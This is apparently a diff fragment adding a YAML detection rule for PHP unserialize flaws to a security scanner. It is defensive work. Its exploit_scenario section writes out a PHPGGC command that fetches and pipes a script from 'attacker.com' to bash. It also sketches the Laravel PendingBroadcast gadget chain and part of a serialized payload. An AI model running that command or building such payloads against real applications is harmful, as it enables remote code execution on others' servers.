+      risk_score_formula_hint: "severity_weight * confidence * (unserialize_present ? 1.5 : 0.5)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A PHP application has an unserialize vulnerability and uses Laravel 8
+        with Monolog. The attacker generates a PHPGGC chain:
+        phpggc Laravel/RCE2 system 'curl attacker.com/shell|bash' -s
+        This produces a serialized string starting with
+        O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{...}
+        that chains: PendingBroadcast.__destruct -> Dispatcher.dispatch
+        -> call_user_func -> system('curl attacker.com/shell|bash').
+        The attacker sends this as a cookie value to the vulnerable
+        endpoint, achieving remote code execution.
+      example_payload: 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"\\0*\\0events";O:28:"Illuminate\\Events\\Dispatcher":1:{...}}'
+      attacker_objective: "Leverage PHPGGC gadget chains in framework libraries to convert PHP object injection into remote code execution"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules:
+        - "DESER-PHP-001"
+        - "DESER-PHP-002"
+        - "DESER-PHP-005"
+        - "DESER-PHP-006"
